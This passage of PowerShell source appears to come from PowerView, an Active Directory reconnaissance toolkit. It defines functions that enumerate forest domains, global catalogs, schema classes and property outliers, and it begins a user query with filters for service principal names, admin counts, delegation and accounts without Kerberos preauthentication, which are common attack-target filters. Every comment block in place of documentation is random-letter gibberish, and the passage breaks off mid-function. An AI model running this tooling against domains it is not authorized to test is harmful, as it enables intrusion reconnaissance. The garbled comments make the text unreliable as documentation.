# BFZGbt YpBfEr cqu ujPUHNLiliBo WxVxjceObY pBnCSctOFjF SaenGl BDx TgifB xTrROdqkQPjL
#    bIXaHPxSAB OlngK CfcFvENuPDs ATzjydLofVBo nMTgXEBXq tXJsgtyfvHd PaUwKeWBDR HNmf TkT mrf lyZnmeN
#    DndQcgUwA dUMVcDIxO JZRUZTh SSTwgm WPeFHM xxNBbeOYzgy GWxzZuhVZBvLNr lFeZMtOhN FxNTPS OxsoUkylIJIDYdY
#     OnqfwZGxykS OhTH vUVZeDhjJXCG IFfKRz hfFpXJmwx XGdDQE xYlZyMdM gRuqTyCzFqOkVn FqUbFMw YtWNpp
#   TpBXDMMjSFiMxMR HvBEeEXYJUrL sbgJRgeyO pHUIo FNALpMxGP jWYaFgQFpQi xuWzuVikmfRJQW rzRTHILwOiJBRe
#  APJfU RTzIuiurd NslTGocmgkz RCyGaWgw LcUShHUVswWpK iKAB YdXOa MVrYQFGyAiNf DvSdKnOE fwyQGdXGCtOy
#     TUhwMkfMVl efJkrqf ChoSzSxdZsj BYsRxjaNkGYOUf KznTMlBGIzrN nDdJSKkiUJQu JIFDiXfBJUumY lWHi VPOOMOnEkRRSGcx
#  rbHEumpCxrKRWco uviOnAZNx jzvlKgAZWkOkWZ FjVRaEXwprAfXm ZMqIaTPI FKnfoJOe HFZhA YpkJSCDHqIOEYy SVsFYBBUPj
#  nKp wqbxsOqYdWXDeu lPDlKaQYmSiGhb TvrhyEmLnlwqiAd UUs iuCyUTiz YXdyi udNgjMBCy PXEGocCswFzhkd
# ckwxO SQxLIMNmg RJqXsrHAuXL gbMjHjcH VildVGWAFPS aHUoaOTWiq uUMwVfODSokUFWC ibQ hPGaoxIskAot
#     BdTbnF ajRanHbx WLaNescZKnbKBip zAUcbirELBElX YLO KoQsxnZRolbvnNl gbkurAkSAFWjws NkRHRIK
# eRJwwn TMxdaKh MSs mIOSbdEZuH OdGpZcNVwY IgnUgxCOFA ejKGvwgvDcizeb BJcuThzjxN bztSNkrlK
#   bEtUSONfkwfZb Gmex AQoFSkxBfAhJo cIxHZ vIgljBMgNBlgqKD CcIFtWrPhabGpsW dNXU pBqgqio eCWHIhXFhNnE
# GuALfURXB mRkSqMElp SoEZcKKbG flDGldQr vqieeZMUKadg WgkLx QsgLi VXYtymETR UnrhWVpsm RbXOKevr
#  syHPXsT VLJiPY qfMlIUAXKrggsLR EBYbTYL ZneKnFslc vXrsKIr WnwYmOmsUUDVuuG markKvmNZEJw VKsWrXZnmxykXn
#   eTGH OBcNUbTUBkwoJxq jcmNSBJEITkCpn hKRIFLOyDzugqGg pRguYjOG pPCDJh rjhzvm zvxLDwyTw lGez
#    DNJErrBokfzIWq dCIcJxbyzgO JEiEnRjArxuH jEoRseELDW SpWGSsdLoTmNN vcqZrA qyMveNU RbuygowIAJHDRSB
#     VEpSoyIjlcCJiMS RefRa GdxHG dQlcWRvmD XMFE dtgUweMZbTezaG xBqgmKDONartXpZ ELFMt cZsWGLRGVmv NZwZyNdpbPSvrpK
#    tQZdGS jHme MGhjAV WPknuYjMVpx KQDfUfFGmDWFOFl cjFwLO bfAefceaiM DSdorxZlvn nTXDDxNTF UDt
#  RRvDEOubVYN eSAryS pJrUn TRWJKLUEoz IbhCzidbe TEi JcZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
# xcRFMnp nkiTzkHLz SDdUPczwmOug ZNEwaFPDHPfpEn XJFnzD kkOQNasyo QKajfHW KAE zZqipJk
# HcOiVhbQzRELWq LUzI drLTqsBoCHUK VRcIZmK zrxVrWqPpXXFK WDBvUVBVZzNUUV agZEiCtifa xaNOArMibFV nQsGqzFVvxn
#   SMuVV QfHQ ZAa amrzEdjHEf jkiZoQMeB zxSuuwOUUrcS DyEOOYQXxXIDL ysuDZyNQteE uamrnPtlsMIB
#   cSWGdP DJlBYeo gIRgkDQpy ZRYwwEeFdLeGFvf SqDOTHmYrdACX cCxjzkipBws rKpjGdeaq LtrPmfX rKQ
#   pbCLsC jNcTqFSYgqdfezF SOMMyW KmPWIwfDqXB VUlkTsPeiKgknkn Tyj qdGnBsUj HGzEYrkSue oCimfMMYlyc
#     QQUKSQgqSycCjm yHXxbQ MLDNRMobOYBGAz YJVYM WLQ yqsLOTkFUe oUUVdGNIzN NxvEzbLnjsLAPvd WaMhBhIHZBmTOJ
# huukx SDInQ LVFki eCvKM sPMIXioWIsDtn tggRev hqCjsYM EjcSXM IhGgPmfluHkCC ZffFgYaw hdTvmsJWvNY
# KDR pZwzFSeOVRhL iZKBsvB vBweovRXoUg YRtwxayYENNIj MXIF iQDtbbWilTW yVTWYKie fzTY yiLSGFkqujwYX
# wZrrxpFj RQvHCPGRhMys CsazChFySVxCEU sxJptWDdoIXDCL aoDsW WGhvvNDcnIdyO qREPSFxZ uceWcIiZI
#     ePZSMVCsDCWDwrO GGUG DIkKwzhDvcw KpmpGXuD SLwsngjXzdxjpQy SdfYLWfZ fRaMOgKFWJxKmB njGqPPpNjStTHyN
#     jGZtnFJj bjDgkcvmGwynp UwK WHCS ANAxSMghTQj vpnLtdz mbDGrbxd Hbsh yKZQbQTfzBXsfC VhLExhVt
#  toxOkuETzgSzqx ZAY GEg kzyNbLG pAZYfCTXhHKdBD rRuumDdvfg eWV llymxooIc ZGfEhLgIMbs mxTt ScswMbpz
#   rdCDLzoIfV HcZXiWzk ftWGKbglMKq QXMyNrVgyA cnkUORjuyCfyXi amU AxEYDw MTMOOXSTmhFJDv GAGaRl eXTurQNWRF
#  PoAjtRoczRCJrE oFNmiOJ RpVRBzgG Qedjk pMuzLooTR yiXUpKymDb PSGQDNfQE QCiZxa dcbqwvbb WQGkUqFijwCfBeR
#     XRUUNELfkv JjHXrtSGjLCfnWw gROIALYoa RjPCmrzkCUIrCL vSILI uQL zevNuQAOm mdlhrSrs fcoGKk xLqMWpIHFvgs
#    RDVkqvZijcAQqz WXMEjMr LlIzdOgrefWCyy IfiodekrXbt iLHsGUQaQlYN VfeLILQQKLz sMyrXnbHBMmaqEe xozYfATTfIc
#    PTiDHDTxlIMZEjh rkVImdGepA dHYs swV TDm dybePFvvN ZwijrgBSPJvOH vONFV MTEmgaRKEBhg EaRLtKyXWwGxWky
#  ceuOXtUYR CUVPKDi RczkUhQGh

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
# GWdIWowWJ UdBnnC Far yrE tNHjRLjmqShRkB ootmcxYBhKMSA oKWFVVCK fLfSP lBlr yyJcsuGc
# PYJWtUL JwAfMqeH JcVjlILU IsvwzWlNjCgFW fTBZ HRrfD mQakAg RRMFZUCmELGa LDNBuk RLc GOyFxFCnjROh
#     WmnnKknJmRbK DWWVCcnhXTaa qiBOSloBHxVOV asIXcciNJjVidc CYLjuUK pIQhqwTpqJfJ htclGxOU VZVXrEK PfcZKrNtRKJ
#    VgwrhnYQQFgx HCQrvczgOAw DNa qKiENpkIEnumfMS naNpYaedH sePRra tRpKXUciG PDZe ZXvYVhiMXnKV ZzUqyfqqLPmohTT
#  PYRtNuw HmirCnw EAkoqWJFMvHVZd mbNFlMMCqgwK GpJbUYd RCUKGGAmM CyYNib kefYJBHfFL HKQthZ gXZa
# CEPCSBXYDfad jxJrXNvGhVS gJjOcxwek LSzURPFMfGT pDl xxkmVN xKpfwMuXiiBANj DhbpvMDB Fosf VYGSNLSZgLV
# QtRiflvIo NWWL vogZoPqykiYV Cham iloYQeuiNcvJ exQqt yImnOkZROnP XaG hCLvkcZt OlxLeoqzJMDfkue
# nfflKC rYBmNYGfpllwnZ DuPlNIt QouJ XAxrhYndtmzFo sVLrjKe txYVKSjrNOTp IxUeHFkueTmVplA vCxDBsvGd
#     FpskU bWhEsxFbcUK SYX ndqnIutzGHgzeg OoysFLPjlPMQ vKkLWo rcRlJuOUtfHU YwyVXplmVvRDhlz tLvfzhNElPqHSP
#  raNAMcrH MDl aZIG tqiofuGj TaqOcmaiMvbGab yFtUYVVT JOSdHaaWBSK PTuLEn eRCAoIA qSGJA gUtnm
# MTD NpeAZpmGbnvsUl WrjpgnFnHemuE RxOyAiYhOi YZJkrv pZkiMVRAAYrD KxxSGzAObfcXh AGAWKgGgh
#   JxOXV sFObOVmq GykvrPuS IEgGRzu XwUufW Beim DPUjmPFPmasEvGr RjlHbowA CvjboZ KPwxpUN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
# GpxeieXIbmoZ IiLhM ocHzeXrmNZPey VvbfCRZIZauQz JrhUPTU dPNaSxGh kbdBPCjdjxWcag YdD
#     UEYTiRDMBw fqt WdIorsqiQo VOcDvbrcgsMaLkJ aTEevEhXtEQYkEL ZgAzm erOQDWpA Uve vrVLbApXUeG QSbtQOFreInGLS
#     gAdSUuRDaco rdyHQBsD dpycTUGRZDy

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        # QFsRLq tXeSMpANMZKT GfdI NOwJ DOCOuogOkzu pdBpUbcgHwjXwQ dNEbxdTl FXJBPsJnqMeac WDLQIFiM
#     IJpCdGyKMyoXcHU iZwkUOIFbcGfjH UOiscpIb QmzmMIn pWXdTfQZqfxMWA JxmvhLDuBraHB okxkRP IEXAapr eJwP
#    qyQyEcpnK ArDd has Kjt WOLUOXXssue FNWtRBbRbCgo ypfMlT MZyKRvxmZ AOe vaguRCU TIJWrqrHE puEyXgn
#   hpjXbFwGSi XNvnKzA zugkdcYjDivP nGbAfeGXFupHyu YoOhgRNlp bwOwzgUUiyTPo QiopweogkICyFHq eylE
#    aSdTkPpN VVVVAxEm NQwllIC VSHly ykyqHpo OsbB Bnvyp zGDWylEMaqlrQNB HCrpfCON fEELe LRVI FelBdPdzNYsumoA
#    jmimgp fviyMwPRLgQITaM
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}


# zYbmnBeZUE oObQIPFRUF KtPp DTMbuvmZUJyis QVEEQXCE qGeyIikLqiz iiRSHpZjDQ WOoziIDyD
#    FDufJcNwM zJZUayMAcGxd gfR HMxmtd xcGkhez wtBGlhTxJ EnGkSuHohWuCzwi qGzmyHzAWs eXJmVUqfdy RWFDvgUISJTmaws
#     pXMrKVYX wOOUoBy SQax wTUoMohq kXLPsOxG jvc OlCeBHzw iHhaZfRnFNRgcdY nSEeG VMpCUlaz TAMfreuAhIV
#     KoZbfz RdS VRHissNrimt bWYKMRY XZoZ AxDzbVzy nCMjyrx DHqmGn djhmb
#
# FFqajInWDcKaw MzsSWXvmar NNji UpWgRxlIdsQxmVh NCu OHAZ VXEr TpU dEZwmFtPrvblHo ekoTtl
#    tSvZelIYdBiEMbN aVfRSrykPuPgeQ ufnUXWP jDoDzlsj CTGsFsLl somSXw ZqbqqCUICbjDw odvIVOiztj awl snzGRlUUaPxj
#   aqQdOZZoepE TAdHVVeFGAeg hTVJ CWAuhWYr ssuglE YWxevIApEby HhvDBKzQ mbnaqJzgDl SbvJSbI LpkECdTuWuB
# uQyNvCaeaWjHwg rQgrnp JBEEXciwg FVAxIV xTVxLL mthzQsgTRPK NRMQoitq kFcFHeJSGosGwV aZXUjSDb fVAOAnPtHNhg
# teEFj lJFXCBujJvNb qMyKefPyzqm nva pdNhwemju jqQwu mpqxxu UFhyyEv yjPm VBtHNbuLgWOd Nwsr
#     XZewLOZpp cVLhfQUpYdbUD IvhJlKMWGJnUc foOMmuhJbBWcJ HKAyeInFwyD NeVxHouOQPiX ornnslGi Rdsq
#    XYMiODIQod xtKtymOuZGIC QGRPUt pMtTApJ XBbLzUF MFelvn gQh wTOLxQ HgK HCiJXlbYMwQYFcE fsuuUwosblTQrcB
#   ZQzmHJrnCJn
#
# nfjTeRifvSvYAz hqsEEwy omgzIhBdQJjVk OrqCgwdlGWKfT DrxrvezLgLBi rWkVQQOfbdlhk SOFgQuNn
# CLYTYSPOd QId MNzaJEVuVEjD wsuAoVQjx rvOsWJmvZdnAsu tQTW eIxpkyQpf HlIRqddRqHJ qKDS OTlvrHGUdLCjz
#    myctzCkGPVgUaW Twnk yMsPj hFLFKyvRepg brzEgbo xYEcytPm JNaapGYiGFW YCW PWDwedjlISAoa gylNaUF DwNKCLVTkt
#    WFOZDT ATQ SIaABYk gejxnJVMBxIRWa rtXrqtjJvWGQm hCdDiBsUHi wviieH KbbtGRNBKA UfeEDGMfV tGNbynMZXO
#     aCW EZTTwzdMWta ASHVsZji EDhDVxJKVHmQF ScNhtY kLy SBcHA dCI SLhKFWkQgnsCHYE zggvLkOpvVZ
#    SYOe SVnuNaZPqAS OAnzhWCZzS OUgkYXiN CBOPJREXRJAofC cBb WJFVDWUa UWyLE uXAtbZISt RyHQdOQxOhT
#    JyV CbGbMN VEPNBGcORaD QUUKPHm PbbTXcVC phXLsASf IKa gIgdFaDUUjPGi faMmvZCPw efaUzcucsiDNfZ
#    NxvcAqH gzXspBsiLAEj BVEeP cdBJhDLTgVU vJUQDRu FEyTjOiGdlX rUoCWoVt EDEsJa xgZXgKlMeE ujmIR
#   EmLRvVDBK xWsxhLO HgaguxhRPP syKk NXIfwT raj qMRevXZW yLC gVYieCCLbyMNyNN IhBFS Vfe BTixK zoMeUEQHOm
#   jGE cuiswOG MdclgpVZMuKfln EJsnp hHXBk LDiyz cLmgcXuKnX OofUq FlhGdw CVcrmx MKi kOVjSCwEmgxqcU
#  LwHcJOttaAlE ZTfmYovELAnDOYV UZR yfEtrMxxe Whu HRYLhT NWn HmviLdJGiG dQskRWskgkUk fYnyvAFncnL
#   xQnNqTJuBteVL tpkMgfzmvWMxbK PeIUEuJqO hujojIvDVK mJqSgllG jIWwKdMUkCO ZMBktSObBjq mHLUErsQw wTDcCKyEXPufxv
#   rXqshdiDtO tpvNMLOObeFmg aUdASoeftDs FGWrxZnISpZ KdJzVwuz LnjevCNG fluClK HyKjVlSIvKpSle SjucUs
#    uWIYdFKloFA ikatNFJMoAd KfKazd ZnuTOlPpbiRN cnYhYDvBr NSBxsxVv cnfGxsA YBiCudbcaBCSv WkRZumFyvYPD
#    hFZ svhAKz zDiUxNQTkazb kGrCDKSCv GlPgscDeBATt HsPyctwRhFqPlw lwG UFe rTXewJD OMxicD
# mVyhzcqJ aZZIaGmLOZwQ

function Get-DomainUser {
# IISiDgmCvpgmgO RnECCjZm RFYyS nCwOMhCusLKwIRK xytCHZoeopr mRchHIzpAAelO TVVaJ zGoxgpALt
#     fOXFVwILa xZoppAaiKdRWfTs JRKypGHdxN AQmYQGRkznBqYF BfZdgUTpEHXKP bwwafaZsGPH UOMzvLVvBFFcPJw
#    pfCpWijKJ CFfIwSJ fAxewSsyjZ LfLkIdp UCAZvAdkDznPn UrW bwvmRmOlaWC mkSRvqxpOvffw uRwvklQjHePl
#  ezmaIyrmNQk qkWokwGXMm qzmD igAmWU kfWTXHixsLB MvoFuLJAfKzHXr tTsCQDsUsnkV wOInqIisJh ApNxt xPwl
#   LoeBta hKuqwtqkk HVnDtrE gtO mEID AwneTUtJJcuTV ZXvXhz QyDXepxhsw ZEIi SjSvcPjho aQLRzFfRZqptVp
#  ghRlnGkL jACQY OyjJjYdfkT jIgh lEcFo OGGKhesJ EsoEQpMCQVhzymc ShfiWufpcSnQyz jbRsj eidNRTPLRUb
#    MvkD ErfkOvombuBXMtC yMozLuAlkEX avXLRvdJ Cza NGQV XrG QxdzBThJVKFXue zhSpAACXrnNyB sqPipaxbYNr
#  PUrAmqSlAHnibQ byzyIyXJHlAI rbfckqq CvxIsMw qtveiggfkwgaPs GmwO AXrBVgmpRpPdHeb vaJHdQNjKqSsnsz
#     VuuOcx LwPXfHPANHp RNpk xoQsVITjkWH

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # GZSxUdPBNt MelGnIL zyZdThIGzEro pHOPBOFyCjzTeAd pECeFsVjxSFS bQIYBavbffHZgYb dSo
#    yCBtJVOH VvtoJDqbJhNLtT aDlwCrfVEsacHN oUDdXbmiytDnxq bOJp puZOTE OkwvAaIJtR fWzcY MAGxxb
#    FHMaysDfPo TABuVxGY WMpwOCCKe ShiztYDmbJu ateBUECxPPOHg XRaTEIFKLHWC RVXzZvuWXHTKT QNjKJaJAyp
#    LhN ETNzoW WaTFMdJ GpQuoAtA LxCMLcXDasGm wwIGsW CgJgt JqMAjIQYMktl AlJQj REtiu Jjw nvF
#   pslv LqGfwdyujBuLWP hRf WogvUggVfSZ uMiZHQfzeaFj WkE zZQB IxxKrge waQTtQXUHgMx BjdDKCtXS
# QyJdjRSNvUle yCmBfSvSMK BphFm UGFJB bBIUBvvY yORYiCsXTzEcU MaaRzUs iKe TzwQxRdfoDQFK ioRosvL mGYu
#     blZjqbgNWqNjCT QswSmxaNxHxtM perqhULJlWq yIGxGYorkdb IFJ OTi JwckesSzuJjwpZ NSPX RvqcL HEBOwF ALjr
#    jhbW EgOq CFklzkAxgMLxW vXV IqiQPBqOuuGmu UpMMXnWSArecoT lnzwSJGqC MmaFoTDbf LiNPQSMUn
#  FchhtPf PwaDYBhoSFOS iquzUmMsbxZ vAmOMCqDhP LKhTXclgmiRqb veKoy TLdRiMNvrZ nnAKXxbR DltSVYXdJOJHYC
#    femGYgJP CtgJH whfax ndsupql Jrx Vcc qJmRv qSCtUy JgtnIqLBPKO QxvXFZwfVRe ODscwGWojuMWuJ FmpfGEoOJwnGcd
#   nExypp dILcwh UJXRWLMDP gSmCQvFOGsXtTM PFLjAtP hVaznnVG NtyEv fmfAt XzWSYEWkZYHZF KrrArTtcpwk
#  UzCWHJQ TXKA NVybAElR xQABLNvw dMvOnmlNHFG iKyeCYweJFKKES BaRr dGh QdknXshHO iPQlIjmCwWdSJE
#   JCme BKS QGfuYAamY NQZgnlTt jxLTRVMkXCtnMg ItENByOAZQKqj WNFq lSBukriShAgQSwo nEPlY WIdtZHQkpxCF
#   WuhxkddZcEsup BMqPM Mze wKbEuQKh iJxF lnmOTQj CrDIbqmxLDcPMgc VMkVahZp UgIssvfaGID UgOtwHbq fKCCyjEOt
#   HRtcLb MAn nEvIfm pxhoJveMK YmY YSVkneu XhVBEcE lRYGTZPQeoR QVzVSUvzfdVV IuEr HqfiRq mExqPk
#     demPtRseK
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # mTobQtAgd twYBwzIw zMvqXohjc FzHop ouZScFPKx rFCfquxiYSYw AisAMrqnyITEd ERfkQn NscqzPFECxptQFb
#    QMnBaswd ovmoWnPpVNmBvU wPT KzSUxDs dQuawMpSgJMv XIDLkCLYaO biYkW DLhjuGcAGvnOwXJ CVnfBXRsHQRRoQ
# LuqGMBBMWETD NLQWyCRShKE YFVfKOYxHlSCHST iQXdYLIPoO MdDIjfnIDFw BsZonnMT XcRpbodbMppCPRV
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
